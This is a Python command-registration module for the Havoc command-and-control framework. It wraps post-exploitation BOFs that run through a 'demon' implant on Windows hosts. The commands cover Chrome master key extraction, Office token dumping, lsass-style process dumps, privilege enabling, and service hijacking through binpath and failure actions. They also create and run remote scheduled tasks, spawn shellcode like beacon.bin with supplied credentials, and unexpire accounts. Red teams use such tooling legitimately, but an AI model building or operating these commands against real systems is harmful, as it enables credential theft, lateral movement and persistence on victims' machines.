"""
RemoteOpsExtra
--------------
Sibling wrapper that registers the CS-Remote-OPs-BOF commands that upstream
RemoteOps.py does NOT already register. Upstream RemoteOps.py is left
untouched so future updates to the HavocFramework/Modules repo don't
require a manual merge.

BOFs are compiled by the top-level Havoc `makefile` (bof-build target) into
`client/Modules/RemoteOps/bin/<name>.<arch>.o`, matching the same directory
that upstream RemoteOps.py loads from.
"""

from havoc import Demon, RegisterCommand, RegisterModule


def _int(demon, s, name):
    try:
        return int(s, 0)
    except (TypeError, ValueError):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"{name} must be an integer")
        return None


# ------------------------------------------------------------------ chromeKey
def chromeKey(demonID, *params):
    demon  = Demon(demonID)
    packer = Packer()
    TaskID = demon.ConsoleWrite(
        demon.CONSOLE_TASK, "Tasked demon to extract Chrome master key")
    demon.InlineExecute(TaskID, "go",
        f"bin/chromeKey.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ get_priv
def get_priv(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: get_priv <privilege_name> (e.g. SeDebugPrivilege)")
        return False
    packer = Packer()
    packer.addstr(params[0])
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to enable privilege: {params[0]}")
    demon.InlineExecute(TaskID, "go",
        f"bin/get_priv.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ office_tokens
def office_tokens(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: office_tokens <pid>")
        return False
    pid = _int(demon, params[0], "pid")
    if pid is None:
        return False
    packer = Packer()
    packer.addint(pid)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to dump Office tokens from PID {pid}")
    demon.InlineExecute(TaskID, "go",
        f"bin/office_tokens.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ procdump
def procdump(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: procdump <pid> <remote_dump_path>")
        return False
    pid = _int(demon, params[0], "pid")
    if pid is None:
        return False
    packer = Packer()
    packer.addint(pid)
    packer.addWstr(params[1])
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to procdump PID {pid} -> {params[1]}")
    demon.InlineExecute(TaskID, "go",
        f"bin/procdump.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ ProcessDestroy
def ProcessDestroy(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: ProcessDestroy <pid> <handle_id>")
        return False
    pid       = _int(demon, params[0], "pid")
    handle_id = _int(demon, params[1], "handle_id")
    if pid is None or handle_id is None:
        return False
    packer = Packer()
    packer.addint(pid)
    packer.addint(handle_id)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to destroy handle {handle_id} in PID {pid}")
    demon.InlineExecute(TaskID, "go",
        f"bin/ProcessDestroy.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ ProcessListHandles
def ProcessListHandles(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: ProcessListHandles <pid>")
        return False
    pid = _int(demon, params[0], "pid")
    if pid is None:
        return False
    packer = Packer()
    packer.addint(pid)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to list handles in PID {pid}")
    demon.InlineExecute(TaskID, "go",
        f"bin/ProcessListHandles.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ sc_config
def sc_config(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 5:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: sc_config <hostname> <servicename> <binpath> "
            "<ignore_mode:0|1> <start_mode:0=boot|1=system|2=auto|3=manual|4=disabled>")
        return False
    ignoremode = _int(demon, params[3], "ignore_mode")
    startmode  = _int(demon, params[4], "start_mode")
    if ignoremode is None or startmode is None:
        return False
    packer = Packer()
    packer.addstr(params[0])
    packer.addstr(params[1])
    packer.addstr(params[2])
    packer.addshort(ignoremode)
    packer.addshort(startmode)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to reconfigure service {params[1]} on {params[0]}")
    demon.InlineExecute(TaskID, "go",
        f"bin/sc_config.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ sc_failure
def sc_failure(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 7:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: sc_failure <hostname> <servicename> <reset_period_secs> "
            "<reboot_msg> <command> <num_actions> <actions_string>\n"
            "  actions_string: type/delay/type/delay/... "
            "(type = none|restart|reboot|runcmd)")
        return False
    reset_period = _int(demon, params[2], "reset_period")
    num_actions  = _int(demon, params[5], "num_actions")
    if reset_period is None or num_actions is None:
        return False
    action_map = {"none": "0", "restart": "1", "reboot": "2", "runcmd": "3"}
    parts = params[6].split("/")
    translated = []
    for i, tok in enumerate(parts):
        if i % 2 == 0:
            mapped = action_map.get(tok.lower())
            if mapped is None:
                demon.ConsoleWrite(demon.CONSOLE_ERROR,
                    f"Unknown action type '{tok}'. Use: none, restart, reboot, runcmd")
                return False
            translated.append(mapped)
        else:
            translated.append(tok)
    actions_str = "/".join(translated)
    packer = Packer()
    packer.addstr(params[0])
    packer.addstr(params[1])
    packer.addshort(reset_period)
    packer.addstr(params[3])
    packer.addstr(params[4])
    packer.addshort(num_actions)
    packer.addstr(actions_str)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to set failure actions for service {params[1]} on {params[0]}")
    demon.InlineExecute(TaskID, "go",
        f"bin/sc_failure.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ schtaskscreate
def schtaskscreate(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: schtaskscreate <hostname> <taskpath> <local_xml_file> "
            "[mode:0|1|2] [force:0|1]")
        return False
    try:
        with open(params[2], "r", encoding="utf-8") as fh:
            xml = fh.read()
    except OSError as e:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            f"Failed to read XML file '{params[2]}': {e}")
        return False
    mode  = _int(demon, params[3], "mode")  if len(params) > 3 else 0
    force = _int(demon, params[4], "force") if len(params) > 4 else 1
    if mode is None or force is None:
        return False
    hostname = params[0].lstrip("\\")
    if hostname == "." or hostname.lower() == "localhost":
        hostname = ""
    packer = Packer()
    packer.addWstr(hostname)
    packer.addWstr(params[1])
    packer.addWstr(xml)
    packer.addint(mode)
    packer.addint(force)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to create schtask {params[1]} on {params[0]}")
    demon.InlineExecute(TaskID, "go",
        f"bin/schtaskscreate.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ schtasksdelete
def schtasksdelete(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: schtasksdelete <hostname> <taskname> <is_folder:0|1>")
        return False
    isfolder = _int(demon, params[2], "is_folder")
    if isfolder is None:
        return False
    packer = Packer()
    packer.addWstr(params[0])
    packer.addWstr(params[1])
    packer.addint(isfolder)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to delete schtask {params[1]} on {params[0]}")
    demon.InlineExecute(TaskID, "go",
        f"bin/schtasksdelete.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ schtasksrun
def schtasksrun(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: schtasksrun <hostname> <taskname>")
        return False
    packer = Packer()
    packer.addWstr(params[0])
    packer.addWstr(params[1])
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to run schtask {params[1]} on {params[0]}")
    demon.InlineExecute(TaskID, "go",
        f"bin/schtasksrun.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ schtasksstop
def schtasksstop(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: schtasksstop <hostname> <taskname>")
        return False
    packer = Packer()
    packer.addWstr(params[0])
    packer.addWstr(params[1])
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to stop schtask {params[1]} on {params[0]}")
    demon.InlineExecute(TaskID, "go",
        f"bin/schtasksstop.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ shspawnas
def shspawnas(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 4:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: shspawnas <domain> <username> <password> <local_shellcode_file>")
        return False
    try:
        with open(params[3], "rb") as fh:
            shellcode = fh.read()
    except OSError as e:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            f"Failed to read shellcode file '{params[3]}': {e}")
        return False
    packer = Packer()
    packer.addWstr(params[0])
    packer.addWstr(params[1])
    packer.addWstr(params[2])
    packer.addbytes(shellcode)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to spawn shellcode as {params[0]}\\{params[1]}")
    demon.InlineExecute(TaskID, "go",
        f"bin/shspawnas.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ suspendresume
def suspendresume(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: suspendresume <suspend|resume> <pid>")
        return False
    op = params[0].lower()
    if   op == "suspend": option = 1
    elif op == "resume":  option = 0
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "First arg must be 'suspend' or 'resume'")
        return False
    pid = _int(demon, params[1], "pid")
    if pid is None:
        return False
    packer = Packer()
    packer.addshort(option)
    packer.addint(pid)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to {op} PID {pid}")
    demon.InlineExecute(TaskID, "go",
        f"bin/suspendresume.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# ------------------------------------------------------------------ unexpireuser
def unexpireuser(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: unexpireuser <hostname> <username>")
        return False
    packer = Packer()
    packer.addWstr(params[0])
    packer.addWstr(params[1])
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"Tasked demon to unexpire user {params[1]} on {params[0]}")
    demon.InlineExecute(TaskID, "go",
        f"bin/unexpireuser.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


# =========================================================================
# Registrations
# =========================================================================
RegisterCommand(chromeKey,          "", "chromeKey",          "Extract Chrome master key from current user's DPAPI store",                                    0, "",                                                                                              "")
RegisterCommand(get_priv,           "", "get_priv",           "Enable a Windows privilege on the current process token",                                     0, "<privilege_name>",                                                                              "SeDebugPrivilege")
RegisterCommand(office_tokens,      "", "office_tokens",      "Dump MS Office access tokens from a target process",                                          0, "<pid>",                                                                                         "4321")
RegisterCommand(procdump,           "", "procdump",           "MiniDump a process to disk via dbghelp",                                                      0, "<pid> <remote_dump_path>",                                                                      "1234 C:\\Windows\\Temp\\lsass.dmp")
RegisterCommand(ProcessDestroy,     "", "ProcessDestroy",     "Close a specific handle inside a remote process (from ProcessListHandles output)",            0, "<pid> <handle_id>",                                                                             "1234 0x218")
RegisterCommand(ProcessListHandles, "", "ProcessListHandles", "List all open handles for a target process",                                                  0, "<pid>",                                                                                         "1234")
RegisterCommand(sc_config,          "", "sc_config",          "Reconfigure an existing service (binary path / start mode)",                                  0, """<hostname> <servicename> <binpath> <ignore_mode:0|1> <start_mode:0|1|2|3|4>
  ignore_mode  0 = update binpath, 1 = leave binpath as-is
  start_mode   0=boot 1=system 2=auto 3=manual 4=disabled""",                                                                                                  "\\\\host CoolSvc C:\\Windows\\Temp\\a.exe 0 3")
RegisterCommand(sc_failure,         "", "sc_failure",         "Set the failure actions for an existing service",                                             0, """<hostname> <servicename> <reset_period_secs> <reboot_msg> <command> <num_actions> <actions>
  actions format: type/delayMS/type/delayMS/... (type: none|restart|reboot|runcmd)""",                                                                          "\\\\host CoolSvc 60 \"\" \"cmd /c whoami > C:\\a.txt\" 1 runcmd/0")
RegisterCommand(schtaskscreate,     "", "schtaskscreate",     "Create a scheduled task from a local XML definition",                                         0, "<hostname> <taskpath> <local_xml_file> [mode:0|1|2] [force:0|1]",                                "\\\\host \\Microsoft\\Windows\\Foo /tmp/task.xml")
RegisterCommand(schtasksdelete,     "", "schtasksdelete",     "Delete a scheduled task (or task folder)",                                                    0, "<hostname> <taskname> <is_folder:0|1>",                                                          "\\\\host \\Microsoft\\Windows\\Foo 0")
RegisterCommand(schtasksrun,        "", "schtasksrun",        "Run an existing scheduled task on-demand",                                                    0, "<hostname> <taskname>",                                                                          "\\\\host \\Microsoft\\Windows\\Foo")
RegisterCommand(schtasksstop,       "", "schtasksstop",       "Stop a currently-running scheduled task",                                                     0, "<hostname> <taskname>",                                                                          "\\\\host \\Microsoft\\Windows\\Foo")
RegisterCommand(shspawnas,          "", "shspawnas",          "Spawn shellcode as another user via CreateProcessWithLogon",                                  0, "<domain> <username> <password> <local_shellcode_file>",                                          "CORP alice Password1! /tmp/beacon.bin")
RegisterCommand(suspendresume,      "", "suspendresume",      "Suspend or resume all threads of a target process",                                           0, "<suspend|resume> <pid>",                                                                         "suspend 1234")
RegisterCommand(unexpireuser,       "", "unexpireuser",       "Clear the account-expiration flag on a target user",                                          0, "<hostname> <username>",                                                                          "\\\\host alice")
